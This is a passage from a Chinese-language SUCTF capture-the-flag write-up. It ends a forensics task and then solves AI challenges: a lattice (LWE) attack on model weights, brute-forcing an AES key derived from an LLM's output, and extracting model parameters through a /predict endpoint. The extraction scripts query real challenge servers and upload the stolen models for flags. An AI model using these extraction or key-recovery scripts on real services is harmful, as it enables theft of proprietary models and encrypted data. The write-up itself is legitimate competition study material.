zQt$d3!GIS9l.aR@7ELNA9!fK2@pL4#tM6$wN8%yR1^uD3&hJ5*Z17727207244dE23eFgH7kLmNpOqRstUvWxYz012345678901234567890123456789
```

补充：uTools 为什么能成为突破口

虽然题目里明面上主要提到了记事本、CherryStudio、Ollama，但真正补全密钥的是 `uTools`。

在 `uTools` 中可以看到三类关键证据：

1. 收藏数据库中直接保存了 `key4`
2. 剪贴板历史中保存了 `key1`
3. 剪贴板与本地存储中保存了“4 段”“重排顺序”“第三段=第二密钥时间戳”等规则

特别是：

- uTools collection 数据库中的 key4 记录
- uTools 本地存储里的规则提示

这也是题目 hint “第一密钥请关注 utools” 的含义。

最终 flag 计算

按题目要求，拼接格式是：

```
MD5(Q1_Q2_Q3_Q4_Q5_Q6_Q7)
```

即：

2026/03/05T17:23:06_c1c4c50f51afc97a58385457af43e169_zQt$d3!GIS9l.aR@7ELN_019cbe60-6803-70fe-8ab5-e0035399980f_2026/03/05T22:25:24_zQt$d3!GIS9l.aR@7ELNA9!fK2@pL4#tM6$wN8%yR1^uD3&hJ5*Z17727207244dE23eFgH7kLmNpOqRstUvWxYz012345678901234567890123456789_2026/03/05T21:58:17_40854344-3f6e-4464-a07f-b39d42f5adc5

MD5 结果：

```
39e850db5d740c54df4281e39fb3866d
```

因此最终 flag 为：

```Plain
SUCTF{39e850db5d740c54df4281e39fb3866d}
```

# AI

## SU_BabyAI

"Something is missing" 的提示含义：**求解需要** **`model.pth`** **中的权重**，没有权重就无法还原系数矩阵，是破解的前提。

`generate_task()` 的执行流程：

1. 随机初始化 Conv1d(kernel=3, stride=2) 和 Linear(20→15) 的权重（整数，范围[0,q)）

```Plain
model.conv.weight  # shape: (1,1,3)   -> w_conv: 3个整数
model.fc.weight    # shape: (15,20)   -> w_fc:   15×20个整数
```

2. 对 FLAG（41字节）做卷积

```Plain
conv_out[p] = w_conv[0]*x[2p] + w_conv[1]*x[2p+1] + w_conv[2]*x[2p+2]
p in range(20),  conv_out_size = (41-3)//2+1 = 20
```

3. 全连接层 + 噪声 + 取模

```Plain
Y[i] = ( sum_p w_fc[i][p]*conv_out[p] + noise ) % q
noise = random.randint(-160, 160)
```

关键点： 权重以 `float32` 存储（精度约 24 bit），`q ≈ 10^9 ≈ 2^30`，因此权重被四舍五入为 64 的倍数，但 `model.pth` 中存的就是实际使用的值，加载即可还原。

将两层计算合并，展开 `conv_out[p]`：

$$Y[i] = Σ_{p,k} w_fc[i][p] · w_conv[k] · x[2p+k] + e[i] (mod q)$$

定义组合矩阵 A（15×41）：

$$A[i][j] = Σ_{p,k: 2p+k=j} w_fc[i][p] · w_conv[k] (mod q)$$

则问题化为：

$$\mathbf{Y} \equiv \mathbf{A}\,\mathbf{x} + \mathbf{e} \pmod{q}$$

其中：

- $$\mathbf{x} \in \{32,\ldots,126\}^{41}$$（ASCII 可打印字节）
- $$|e_i| \leq 160$$（噪声极小， $$160 \ll q \approx 10^9$$)

这正是 带误差学习问题（LWE，Learning With Errors） 的标准形式。

信息论可行性：

未知量：41 字节 × 7 bit/字节 = 287 bit 信息量

观测量：15 个方程 × log₂(q) ≈ 450 bit

信息量充足，理论上可以唯一确定 FLAG

估算格的短向量：

对 $$ \mathbf{x} $$做中心化：令 $$\tilde{\mathbf{x}} = \mathbf{x} - 79（$$均值），则 $$ \tilde{x}_i \in [-47, 47]$$。

构造的目标向量为 $$ \mathbf{v} = (-\mathbf{e},\ \tilde{\mathbf{x}},\ 1)$$，其欧氏范数：

$$\|\mathbf{v}\| \approx \sqrt{15 \times 160^2 + 41 \times 47^2 + 1} \approx 689$$

格的高斯启发式（GH）界：

$$\text{GH} \approx q^{15/57} \times \sqrt{\frac{57}{2\pi e}} \approx 1835 \times 1.83 \approx 3352$$

由于 $$ 689 \ll 3352$$（目标向量远短于格中典型向量），LLL 可以高效找到该短向量。

**Step1：****Kannan 嵌入格**

固定已知字节 `SUCTF{`（位置 0–5）和 `}`（位置 40），还原 34 个未知字节。

构造 50×50 的格基矩阵 B（维度 = m + 34 + 1 = 50）：

```Plain
行 0..14   (m=15 行):  q 放在对角线，其余为 0        ← 处理模 q
行 15..48  (34 行):    A'[:,j] | e_j                 ← 每个未知变量 x̃[j]
行 49      (1 行):    -Y''    | 0…0 | 1              ← 目标偏移
```

其中 `Y'' = Y - A[:,known]*known_vals - 79*A'*ones  (mod q)`。

验证：取 1 份末行 + $$\sum_j \tilde{x}[j] $$份对应行 + 若干 q 份，可以凑出目标向量：

$$(-\mathbf{e},\ \tilde{\mathbf{x}},\ 1) \in \mathcal{L}(B)$$

`model.pth` 本质是 ZIP 归档，可直接用 `zipfile` 解析：

```Go
import zipfile, struct
with zipfile.ZipFile('model.pth') as zf:
    d0 = zf.read('model/data/0')   # conv 权重：3 个 float32
    d1 = zf.read('model/data/1')   # fc  权重：300 个 float32
w_conv = [int(v) for v in struct.unpack('<3f', d0)]
w_fc_flat = struct.unpack('<300f', d1)
w_fc = [[int(w_fc_flat[i*20+j]) for j in range(20)] for i in range(15)]
```

得到：

```Plain
w_conv = [711570624, 963400576, 994288832]
```

**Step 2：构造矩阵 A**

```Plain
n, m, q = 41, 15, 1000000007
conv_out_size = (n - 3) // 2 + 1  # = 20
A = [[0]*n for _ in range(m)]
for i in range(m):
    for p in range(conv_out_size):
        for k in range(3):
            j = 2*p + k
            if 0 <= j < n:
                A[i][j] = (A[i][j] + w_fc[i][p] * w_conv[k]) % q
```

**Step 3：固定已知字节，压缩至 34 维：**

```Python
known = {0:83, 1:85, 2:67, 3:84, 4:70, 5:123, 40:125}  # SUCTF{ ... }
unk = [j for j in range(n) if j not in known]            # 34 个未知位置
消去已知贡献
Yred = list(Y)
for j, val in known.items():
    for i in range(m):
        Yred[i] = (Yred[i] - A[i][j]*val) % q
Ared = [[A[i][j] for j in unk] for i in range(m)]  # 15×34
中心化 c=79
c = 79
Yc = [(Yred[i] - sum(Ared[i][j2]*c for j2 in range(34))) % q
      for i in range(m)]
```

**Step 4：构造 嵌入格并运行 LLL**

```Python
sz = m + 34 + 1  # = 50
B = [[0]*sz for _ in range(sz)]
for i in range(m):
    B[i][i] = q
for j2 in range(34):
    for i in range(m):
        B[m+j2][i] = Ared[i][j2]
    B[m+j2][m+j2] = 1
for i in range(m):
    B[m+34][i] = -Yc[i]
B[m+34][m+34] = 1
Bred = lll(B)   # 带增量 GS 更新的浮点 LLL，约 6 秒
```

**Step 5：从规约格基中提取 FLAG**

```Python
for row in Bred:
    for sign in (1, -1):
        if abs(row[-1]) != 1:
            continue
        x_tilde = [sign * row[m+j2] for j2 in range(34)]
        x_full  = [xt + c for xt in x_tilde]
        if not all(32 <= xi <= 126 for xi in x_full):
            continue
        # 还原完整 flag 并验证
        flag = bytearray(41)
        for j, val in known.items():
            flag[j] = val
        for idx, j in enumerate(unk):
            flag[j] = x_full[idx]
        if verify(flag):
            print(flag.decode())
```

exp：

```Java
import zipfile, struct, time
import numpy as np

# ── 加载权重 ──────────────────────────────────────────────────────────────────
with zipfile.ZipFile('model.pth') as zf:
    d0 = zf.read('model/data/0')
    d1 = zf.read('model/data/1')

w_conv = [int(v) for v in struct.unpack('<3f', d0)]
w_fc_flat = struct.unpack('<300f', d1)
w_fc = [[int(w_fc_flat[i*20+j]) for j in range(20)] for i in range(15)]

# ── 参数 ──────────────────────────────────────────────────────────────────────
n, m, q = 41, 15, 1000000007
Y = [776038603, 454677179, 277026269, 279042526, 78728856, 784454706,
     29243312, 291698200, 137468500, 236943731, 733036662, 421311403,
     340527174, 804823668, 379367062]
conv_out_size = (n - 3) // 2 + 1  # 20

# ── 构造矩阵 A ────────────────────────────────────────────────────────────────
A = [[0]*n for _ in range(m)]
for i in range(m):
    for p in range(conv_out_size):
        for k in range(3):
            j = 2*p + k
            if 0 <= j < n:
                A[i][j] = (A[i][j] + w_fc[i][p] * w_conv[k]) % q

# ── 固定已知字节，压缩问题维度 ────────────────────────────────────────────────
known = {0:83,1:85,2:67,3:84,4:70,5:123,40:125}
unk = [j for j in range(n) if j not in known]
nu = len(unk)  # 34

Yred = list(Y)
for j, val in known.items():
    for i in range(m):
        Yred[i] = (Yred[i] - A[i][j]*val) % q

Ared = [[A[i][j] for j in unk] for i in range(m)]
c = 79
Yc = [(Yred[i] - sum(Ared[i][j2]*c for j2 in range(nu))) % q for i in range(m)]

# ── Kannan 嵌入格 ─────────────────────────────────────────────────────────────
sz = m + nu + 1  # 50
B = [[0]*sz for _ in range(sz)]
for i in range(m):
    B[i][i] = q
for j2 in range(nu):
    for i in range(m):
        B[m+j2][i] = Ared[i][j2]
    B[m+j2][m+j2] = 1
for i in range(m):
    B[m+nu][i] = -Yc[i]
B[m+nu][m+nu] = 1

# ── 带增量 GS 更新的浮点 LLL ──────────────────────────────────────────────────
def lll(B_in, delta=0.99):
    n = len(B_in)
    sz = len(B_in[0])
    B = [list(row) for row in B_in]
    mu  = [[0.0]*n for _ in range(n)]
    D   = [0.0]*n
    Bst = [np.zeros(sz) for _ in range(n)]

    for i in range(n):
        Bst[i] = np.array(B[i], dtype=np.float64)
        for j in range(i):
            if D[j] > 1e-30:
                mu[i][j] = float(np.dot(Bst[i], Bst[j])) / D[j]
            Bst[i] -= mu[i][j] * Bst[j]
        D[i] = float(np.dot(Bst[i], Bst[i]))

    k = 1
    while k < n:
        for j in range(k-1, -1, -1):
            r = int(np.round(mu[k][j]))
            if r == 0: continue
            Bk, Bj = B[k], B[j]
            for l in range(sz): Bk[l] -= r * Bj[l]
            for s in range(j): mu[k][s] -= r * mu[j][s]
            mu[k][j] -= r

        if D[k] >= (delta - mu[k][k-1]**2) * D[k-1]:
            k += 1
        else:
            B[k], B[k-1] = B[k-1], B[k]
            d, Dk, Dkm1 = mu[k][k-1], D[k], D[k-1]
            Dn = Dk + d*d*Dkm1
            mu[k][k-1] = d * Dkm1 / Dn
            D[k-1], D[k] = Dn, Dkm1*Dk/Dn
            for j in range(k-1): mu[k][j], mu[k-1][j] = mu[k-1][j], mu[k][j]
            for i in range(k+1, n):
                a, b = mu[i][k-1], mu[i][k]
                mu[i][k-1] = (b*Dk + d*a*Dkm1) / Dn
                mu[i][k]   = a - d*b
            new_km1 = Bst[k] + d*Bst[k-1]
            new_k   = (Dk/Dn)*Bst[k-1] - (d*Dkm1/Dn)*Bst[k]
            Bst[k-1], Bst[k] = new_km1, new_k
            k = max(k-1, 1)
    return B

Bred = lll(B)

# ── 提取 FLAG ─────────────────────────────────────────────────────────────────
def verify(flag):
    x = list(flag)
    co = [sum(w_conv[k]*x[2*p+k] for k in range(3)) for p in range(conv_out_size)]
    for i in range(m):
        val = sum(w_fc[i][p]*co[p] for p in range(conv_out_size))
        diff = (val - Y[i]) % q
        if diff > 160 and q - diff > 160:
            return False
    return True

for row in Bred:
    for sign in (1, -1):
        if abs(row[-1]) != 1: continue
        xf = [sign*row[m+j2]+c for j2 in range(nu)]
        if not all(32 <= v <= 126 for v in xf): continue
        flag = bytearray(n)
        for j, val in known.items(): flag[j] = val
        for idx, j in enumerate(unk): flag[j] = xf[idx]
        if verify(flag):
            print(flag.decode())
```

输出：

```Plain
SUCTF{PyT0rch_m0del_c4n_h1d3_LWE_pr0bl3m}
```

## SU_easyLLM

**题目分析**

**1. 接口探测**

访问任意端点（GET 请求），返回如下 JSON：

```JSON
{
  "algo": "AES-128-CBC",
  "iv_b64": "<base64编码的随机IV>",
  "ciphertext_b64": "<base64编码的密文>",
  "key_derivation": "key = SHA256(LLM_output)[:16]",
  "llm": {
    "provider": "z.ai",
    "model": "GLM-4-Flash",
    "temperature": 0.28,
    "system_prompt": "You are a password generator.\nOutput ONE password only.\nFormat strictly: pw-xxxxxxxx where x are letters.\nNo explanation, no quotes, no punctuation.",
    "user_prompt": "Generate the password now."
  }
}
```

通过 `/docs` 路径可以看到这是一个 FastAPI 应用，仅有一个 GET `/` 端点。

**2. 加密逻辑分析**

服务端每次收到请求时执行以下流程：

1. 调用**智谱AI**（z.ai）的 **GLM-4-Flash** 模型，使用固定的 system_prompt 和 user_prompt，temperature=0.28

1. LLM 返回一个密码字符串（格式为 `pw-xxxxxxxx`）
2. 密钥推导：`key = SHA256(LLM_output)[:16]`，即对 LLM 原始输出取 SHA256 哈希的前 16 字节
3. 使用 **AES-128-CBC** 模式，配合随机生成的 IV 加密 flag

1. 将密文、IV 及所有参数（包括 LLM 的完整调用参数）返回给用户

**3. 突破点**

题目是一个**透明加密挑战**——告诉了你加密算法、密钥推导方式、LLM 的模型名称、完整 prompt 和 temperature 参数。唯一缺失的信息是 **LLM 的具体输出**。

关键观察：

\- **temperature=0.28** 较低，意味着 LLM 输出较为确定，但不完全固定（不是 0）

- GLM-4-Flash 对这个高度约束的 prompt，输出空间很小（每次调用只会产生少量几种不同的密码）
- 只要我们自己调用同一个模型、使用完全相同的参数，就能收集到所有可能的输出
- 然后遍历这些候选输出，逐一尝试解密服务端返回的密文

**解题步骤**

**Step 1: 获取智谱AI API Key**

前往 [智谱AI开放平台](https://open.bigmodel.cn/) 注册账号。**GLM-4-Flash 模型是免费的**，注册后即可获取 API Key。

**Step 2: 收集 LLM 候选输出**

使用智谱AI SDK，以完全相同的参数多次调用 GLM-4-Flash，收集所有可能的输出：

```Python
from zhipuai import ZhipuAI

client = ZhipuAI(api_key="YOUR_API_KEY")

SYSTEM_PROMPT = """You are a password generator.
Output ONE password only.
Format strictly: pw-xxxxxxxx where x are letters.
No explanation, no quotes, no punctuation."""

USER_PROMPT = "Generate the password now."

outputs = set()
for i in range(20):
    response = client.chat.completions.create(
        model="GLM-4-Flash",
        messages=[
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": USER_PROMPT},
        ],
        temperature=0.28,
    )
    out = response.choices[0].message.content.strip()
    outputs.add(out)

print(f"Unique outputs ({len(outputs)}): {outputs}")
```

实测 20 次调用得到约 19 个不同输出（temperature 不为 0 所以有一定随机性），例如：

```Plain
pw-8d9f3g2h, pw-AbcDfghIjkl, pw-8Z2v5K7p, pw-7b2t9z4v, ...
```

**Step 3: 获取密文并遍历解密**

从题目端点获取加密 challenge，用每个候选密码尝试解密：

```Python
import requests, hashlib, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_flag(ciphertext_b64, iv_b64, llm_output):
    key = hashlib.sha256(llm_output.encode()).digest()[:16]
    iv = base64.b64decode(iv_b64)
    ct = base64.b64decode(ciphertext_b64)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except:
        return None

# 获取 challenge
ch = requests.get("http://101.245.107.149:10013/").json()

for out in outputs:
    flag = decrypt_flag(ch["ciphertext_b64"], ch["iv_b64"], out)
    if flag and "SUCTF{" in flag:
        print(f"FLAG: {flag}")
        print(f"LLM output: '{out}'")
        break
```

**Step 4: 获得 Flag**

成功解密后得到 flag。如果第一次没命中（服务端那次生成的密码恰好不在候选列表中），多刷几次 challenge 即可——由于输出空间很小，很快就会匹配上。

**完整 Exploit 脚本**

```Python
#!/usr/bin/env python3
import requests
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from zhipuai import ZhipuAI

ZHIPU_API_KEY = "YOUR_ZHIPUAI_API_KEY"
ENDPOINT = "http://101.245.107.149:10013/"

client = ZhipuAI(api_key=ZHIPU_API_KEY)

SYSTEM_PROMPT = """You are a password generator.
Output ONE password only.
Format strictly: pw-xxxxxxxx where x are letters.
No explanation, no quotes, no punctuation."""
USER_PROMPT = "Generate the password now."

def decrypt_flag(ciphertext_b64, iv_b64, llm_output):
    key = hashlib.sha256(llm_output.encode()).digest()[:16]
    iv = base64.b64decode(iv_b64)
    ct = base64.b64decode(ciphertext_b64)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except:
        return None

def call_glm4_flash():
    response = client.chat.completions.create(
        model="GLM-4-Flash",
        messages=[
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": USER_PROMPT},
        ],
        temperature=0.28,
    )
    return response.choices[0].message.content.strip()

# Step 1: 收集候选密码
print("[*] Collecting GLM-4-Flash outputs...")
outputs = set()
for i in range(20):
    out = call_glm4_flash()
    outputs.add(out)
print(f"[*] Collected {len(outputs)} unique outputs")

# Step 2: 遍历尝试解密
for attempt in range(50):
    ch = requests.get(ENDPOINT).json()
    for out in outputs:
        flag = decrypt_flag(ch["ciphertext_b64"], ch["iv_b64"], out)
        if flag and "SUCTF{" in flag:
            print(f"\n[*] FLAG: {flag}")
            print(f"[*] Matched LLM output: '{out}'")
            exit(0)

print("[!] Failed - try collecting more outputs")
```

**Flag**

```Plain
SUCTF{LLM_w1ll_ch4nge_ev3rything}
```

## SU_thief

1.访问靶机，首页是空页面。通过目录扫描和测试发现两个关键端点：

- `/predict` - POST接口，接受图像输入，返回模型预测结果
- `/flag` - POST接口，接受模型文件，验证参数差异后返回flag
- 源码分析

题目提供了源码 `app.py`，关键代码如下：

```Python
class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.linear = nn.Linear(256, 256)
        self.conv = nn.Conv2d(1, 1, (3, 3), stride=1)
        self.conv1 = nn.Conv2d(1, 1, (2, 2), stride=2)

    def forward(self, x):
        x = nn.functional.pad(x, (2, 0, 2, 0), mode='constant', value=0)
        x = self.conv(x)
        x = self.conv1(x)
        x = x.view(-1)
        x = self.linear(x)
        return x

@app.route('/flag', methods=['POST'])
def flag():
    # 加载用户上传的模型
    user_model.load_state_dict(torch.load(model_file, weights_only=True, map_location=device))

    # 验证参数差异
    threshold_weight = 0.0005
    threshold_bias = 0.005

    for i, (param, user_param) in enumerate(zip(model.parameters(), user_model.parameters())):
        if param.dim() == 2:
            if torch.any(~(abs(param - user_param) <= threshold_weight)):
                return jsonify({'error': f'Layer weight difference too large at layer {i}'}), 400
        elif param.dim() == 1:
            if torch.any(~(abs(param - user_param) <= threshold_bias)):
                return jsonify({'error': f'Layer bias difference too large at layer {i}'}), 400

    # 返回flag
    with open('/app/flag', 'r') as f:
        flag = f.read()
    return jsonify({'flag': f'Here is your flag: {flag}'})
```

3. 关键约束

1. 服务器模型是基于 `model_base.pth` 进行迁移学习得到的
2. 上传的模型参数必须与服务器模型参数差异极小：
   1. 权重差异 ≤ 0.0005
   2. 偏置差异 ≤ 0.005
3. 模型加载使用 `weights_only=True`，无法利用pickle反序列化漏洞
4. 模型结构

```Plain
输入: (batch, 1, 32, 32)
  ↓
Padding: (2, 0, 2, 0) → (batch, 1, 34, 34)
  ↓
Conv2d(1→1, 3x3) → (batch, 1, 32, 32)
  ↓
Conv2d(1→1, 2x2, stride=2) → (batch, 1, 16, 16)
  ↓
Flatten → (batch, 256)
  ↓
Linear(256→256) → (batch, 256)
```

解题思路

方法：最小二乘法精确提取参数

由于阈值非常小，普通的模型窃取方法（如训练学生模型）无法达到精度要求。我们需要**精确提取**参数。

核心思想

对于Linear层：`y = Wx + b`

如果我们能获取足够多的 `(x, y)` 对，就可以通过最小二乘法精确求解 `W` 和 `b`。

关键insight：

- 保持conv层参数不变（使用基础模型的参数）
- 只需要精确提取linear层的参数
- conv层的输出 = linear层的输入

步骤

1. **加载基础模型**：使用题目提供的 `model_base.pth`
2. **收集数据**：

- 通过hook获取conv1层的输出（即linear层的输入 `x`）
- 通过 `/predict` 接口获取远程模型输出 `y`
- **最小二乘求解**：

- 构建方程组：`Y = X @ W.T + b`
- 使用 `np.linalg.lstsq` 求解
- **更新参数并上传**

完整Exploit代码

```Python
import torch
import torch.nn as nn
import requests
import base64
import io
import numpy as np

url = "http://1.95.113.59:10003"

class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.linear = nn.Linear(256, 256)
        self.conv = nn.Conv2d(1, 1, (3, 3), stride=1)
        self.conv1 = nn.Conv2d(1, 1, (2, 2), stride=2)

    def forward(self, x):
        x = nn.functional.pad(x, (2, 0, 2, 0), mode='constant', value=0)
        x = self.conv(x)
        x = self.conv1(x)
        x = x.view(-1)
        x = self.linear(x)
        return x

def query_model(input_data):
    try:
        response = requests.post(f"{url}/predict",
                                json={"image": input_data.tolist()},
                                timeout=10)
        if 'prediction' in response.json():
            return torch.tensor(response.json()['prediction'], dtype=torch.float32)
    except:
        pass
    return None

# 1. 加载基础模型
print("Loading base model...")
model = Net()
base_state_dict = torch.load('model_base.pth', weights_only=True, map_location='cpu')
model.load_state_dict(base_state_dict)

# 2. 注册hook获取中间层输出
activations = {}

def get_activation(name):
    def hook(model, input, output):
        activations[name] = output.detach()
    return hook

model.conv1.register_forward_hook(get_activation('conv1'))

# 3. 收集数据
print("Collecting intermediate activations...")
linear_inputs = []
linear_outputs = []

for i in range(300):
    x = torch.randn(1, 1, 32, 32)

    model.eval()
    with torch.no_grad():
        _ = model(x)

    remote_output = query_model(x)

    if remote_output is not None and 'conv1' in activations:
        conv1_out = activations['conv1'].view(-1)
        linear_inputs.append(conv1_out.numpy())
        linear_outputs.append(remote_output.numpy())

    if (i+1) % 50 == 0:
        print(f"  Collected {i+1}/300")

print(f"Collected {len(linear_inputs)} samples")

# 4. 最小二乘法求解linear层参数
X = np.array(linear_inputs)
Y = np.array(linear_outputs)

# 添加偏置项: [X, 1]
X_with_bias = np.c_[X, np.ones(len(X))]

# 求解: theta = (X^T X)^-1 X^T Y
theta, residuals, rank, s = np.linalg.lstsq(X_with_bias, Y, rcond=None)

W_extracted = theta[:-1, :].T  # (256, 256)
b_extracted = theta[-1, :]     # (256,)

print(f"Extracted W shape: {W_extracted.shape}")
print(f"Extracted b shape: {b_extracted.shape}")

# 5. 更新模型参数
with torch.no_grad():
    model.linear.weight.copy_(torch.tensor(W_extracted, dtype=torch.float32))
    model.linear.bias.copy_(torch.tensor(b_extracted, dtype=torch.float32))

# 6. 验证
print("\nTesting extracted model...")
test_x = torch.randn(1, 1, 32, 32)
with torch.no_grad():
    pred = model(test_x)
remote = query_model(test_x)

if remote is not None:
    diff = torch.abs(pred - remote).max().item()
    print(f"Max output difference: {diff:.6f}")

# 7. 上传获取flag
print("\nUploading model...")
buffer = io.BytesIO()
torch.save(model.state_dict(), buffer)
model_base64 = base64.b64encode(buffer.getvalue()).decode()

response = requests.post(f"{url}/flag",
                        json={"model": model_base64},
                        timeout=10)
print("Response:", response.json())
```

运行结果

```Plain
Loading base model...

Collecting intermediate activations...
  Collected 50/300
  Collected 100/300
  Collected 150/300
  Collected 200/300
  Collected 250/300
  Collected 300/300

Collected 300 samples
X shape: (300, 257)
Y shape: (300, 256)

Extracted W shape: (256, 256)
Extracted b shape: (256,)

Testing extracted model...
Max output difference: 0.031250

Uploading model...
Response: {'flag': 'Here is your flag: SUCTF{n0t_4ll_h1st0ry_t3lls_th3_truth_6a4e2b8d}'}
```

flag

```Plain
SUCTF{n0t_4ll_h1st0ry_t3lls_th3_truth_6a4e2b8d}
```

## SU_谁是小偷

**源码分析**

本地给到的服务逻辑核心是两个接口：

**`/predict`**

它会把用户输入的张量直接送进真模型，然后返回完整输出向量。

这说明我们拿到的是一个强黑盒接口，而且输出不是类别下标，而是完整数值向量。

**`/flag`**

它会读取我们上传的 `state_dict`，然后逐参数和真模型比较：

```Python
if torch.sum(~(abs(param - user_param) <= 0.01)):
    return jsonify({'error': 'Layer weight difference too large'}), 400
```

这段逻辑意味着：

- 不是比较功能是否一致
- 而是比较每一个参数值是否足够接近

所以如果只恢复一个“功能等价模型”，还不够，必须进一步恢复到与真模型同一组参数表示。

**先确认真实模型尺寸**

题面和附件里有一些互相冲突的信息，不能直接全信。

实际做法是直接打接口试输入尺寸。

当输入是 `19 x 19` 时，`/predict` 正常返回。

当输入是 `20 x 20` 时，报错类似：

```Plain
mat1 and mat2 shapes cannot be multiplied (1x289 and 256x256)
```

这说明：

- 卷积后展平长度是 `256`
- 也就是卷积输出是 `16 x 16`

若输入边长是 `19`，卷积输出边长是 `16`，那么卷积核边长就是：

```Plain
19 - k + 1 = 16
=> k = 4
```

因此远端的真实模型结构是：

- 输入：`1 x 19 x 19`
- 卷积层：`Conv2d(1, 1, 4x4)`
- 展平后长度：`256`
- 线性层：`Linear(256, 256)`

**为什么可以完整偷出模型函数**

模型前向没有激活函数，本质上是一个纯线性系统：

```Plain
f(x) = A x + b
```

其中：

- 输入维度：`19 * 19 = 361`
- 输出维度：`256`

所以只要拿到：

- 零输入对应输出 `b`
- 每个标准基输入 `e_i` 对应输出 `f(e_i)`

就能恢复完整矩阵 `A`：

```Plain
A[:, i] = f(e_i) - f(0)
```

也就是说，总共只需要：

- 1 次全零输入
- 361 次 one-hot 输入

就能把整个黑盒函数完整拷走。

**第一阶段：恢复整体线性映射**

脚本里对应的是 `steal_linear_map()`。

做法很直接：

1. 输入一个全零的 `19 x 19` 张量，得到偏置项 `base`
2. 对 361 个像素位置分别构造 one-hot 输入
3. 逐列恢复 `256 x 361` 的整体映射矩阵

即：

```Plain
linear_map.shape = (256, 361)
```

这一步完成后，我们已经完全掌握了 `/predict` 的行为。

**第二阶段：从整体映射拆出卷积核**

把 `linear_map` reshape 成：

```Plain
responses.shape = (256, 19, 19)
```

对每个输出神经元 `i`，有一个二维响应图 `F_i`，并满足：

```Plain
F_i = W_i (*) K
```

其中：

- `W_i` 是线性层第 `i` 行 reshape 成的 `16 x 16`
- `K` 是共享的 `4 x 4` 卷积核
- `(*)` 表示 full convolution

这一步的关键观察是：

- 所有 `F_i` 共享同一个卷积核
- 所以它们的边界行和投影多项式会共享公共因子

**先恢复卷积核第一行**

取所有响应图的第一行 `F_i[0, :]`，这些一维序列共享卷积核第一行对应的多项式因子。

对它们求公共根后，可恢复卷积核第一行：

```Plain
[1, 5/3, -1/6, 2/3]
```

即：

```Plain
[1.0, 1.6666667, -0.1666667, 0.6666667]
```

**利用不同列投影恢复整个核**

再对响应图按列做加权投影：

```Plain
sum_c F[:, :, c] * t^c
```

对多个不同的 `t` 求公共因子，再做插值，就能恢复整个 `4 x 4` 卷积核。

最终核为：

```Plain
[[ 1.          1.6666667  -0.16666669  0.6666667 ]
 [-1.          0.16666667 -1.3333334  -1.3333334 ]
 [-1.5         1.1666666  -1.          0.66666687]
 [ 0.8333333  -1.         -1.3333334   1.        ]]
```

写成分数更直观：

```Plain
[[ 1,    5/3, -1/6,  2/3 ],
 [ -1,   1/6, -4/3, -4/3 ],
 [ -3/2, 7/6, -1,    2/3 ],
 [ 5/6, -1,   -4/3,  1   ]]
```

这个结果非常规整，说明恢复方向是正确的。

**第三阶段：恢复线性层权重**

卷积核已知以后，对每个输出神经元都有：

```Plain
F_i = W_i (*) K
```

其中：

- `F_i` 已知
- `K` 已知
- `W_i` 未知

把 full convolution 展开成线性方程组：

```Plain
M * vec(W_i) = vec(F_i)
```

其中：

- `M` 是由卷积核构造出的 `361 x 256` 矩阵
- `vec(W_i)` 是待求的 `16 x 16` 展平向量

对 256 个输出神经元逐个做最小二乘，即可恢复整个 `linear.weight`。

恢复出来后数值几乎全是整数，四舍五入即可得到稳定结果。

**为什么功能恢复了，****`/flag`** **还是不过**

这一点是本题真正的坑。

如果直接提交：

- `conv.weight = K`
- `conv.bias = 0`
- `linear.weight = W`
- `linear.bias = base`

虽然这个模型和 `/predict` 的输出完全一致，但 `/flag` 仍然会返回：

```Plain
Layer weight difference too large
```

原因是：

```Plain
黑盒恢复的是函数，而服务端校验的是参数。
```

这两个目标在本题里不是同一件事。

**参数表示的不唯一性**

对于结构：

```Plain
y = linear(conv(x))
```

存在天然的缩放自由度。

如果把卷积核乘一个常数 `a`，再把线性层权重除以 `a`，整体函数不变：

```Plain
conv.weight' = a * conv.weight
linear.weight' = linear.weight / a
```

另外，卷积偏置和线性偏置之间也可以重分配。

若卷积偏置为 `b`，则卷积输出每个位置都会增加一个常数 `b`，经过线性层后会对输出增加：

```Plain
b * row_sum(linear.weight)
```

因此可以把一部分量从 `conv.bias` 转移到 `linear.bias`，而整体函数保持不变。

这就是为什么只恢复函数还不够。

**最终利用思路**

设恢复出的参数为：

- 卷积核：`K`
- 线性层：`W`
- 全零输入输出：`base`
- `row_sums = W.sum(axis=1)`

那么一族函数等价参数可以写为：

```Plain
conv.weight = a * K
conv.bias = a * b
linear.weight = W / a
linear.bias = base - b * row_sums
```

然后在合理范围内枚举 `a` 和 `b`。

脚本里使用的候选是：

```Python
scales = [-6, -3, -2, -1, -2/3, -1/2, -1/3, -1/6, 1/6, 1/3, 1/2, 2/3, 1, 2, 3, 6]
biases = [0, -2/3, 2/3, -1, -1/2, 1]
```

最终命中的组合是：

```Plain
scale = -6
bias = -2/3
```

于是通过校验的真实参数表示为：

```Plain
conv.weight = -6 * K
conv.bias = 4
linear.weight = W / -6
linear.bias = base + (2/3) * row_sums
```

提交后即可拿到 flag。

**solve.py 说明**

当前目录中的 [solve.py](E:\Desktop\suctf\SU_谁是小偷\solve.py) 实现了完整利用流程：

1. 通过 `/predict` 拉取整体线性映射
2. 从整体映射恢复共享 `4 x 4` 卷积核
3. 在卷积核已知的前提下恢复 `linear.weight`
4. 枚举等价参数族
5. 向 `/flag` 提交，直到命中正确参数表示

运行方式：

```Bash
python solve.py
```

**关键代码片段**

**1. 拉取整体线性映射**

```Python
base = results[None]
linear_map = np.stack([results[i] - base for i in range(N * N)], axis=1)
```

**2. 恢复卷积核**

```Python
responses = linear_map.reshape(256, 19, 19)
first_row = common_factor_coeffs(responses[:, 0, :])
```

然后对不同 `t` 的投影求公共因子并插值，得到完整卷积核。

**3. 恢复线性层**

```Python
sol, *_ = lstsq(conv_matrix, responses[i].reshape(-1))
weight[i] = sol.reshape(16, 16)
```

**4. 枚举参数自由度**

```Python
status, text = submit(
    linear_weight / scale,
    base - bias * row_sums,
